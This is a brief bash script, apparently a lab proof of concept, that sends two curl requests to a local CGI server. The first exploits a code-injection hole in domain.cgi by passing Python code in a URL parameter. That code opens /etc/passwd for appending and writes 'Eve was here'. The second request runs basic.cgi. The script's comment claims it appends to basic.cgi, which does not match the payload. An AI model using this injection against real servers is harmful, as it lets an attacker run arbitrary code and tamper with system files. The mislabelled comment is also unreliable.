#!/usr/bin/env bash

# Append a line to basic.cgi
curl "http://localhost:4567/cgi-bin/domain.cgi?function=open(%27/etc/passwd%27,%20%27a%27).write(%22Eve was here%22)" 

# Execute basic.cgi 
curl -s "http://localhost:4567/cgi-bin/basic.cgi"
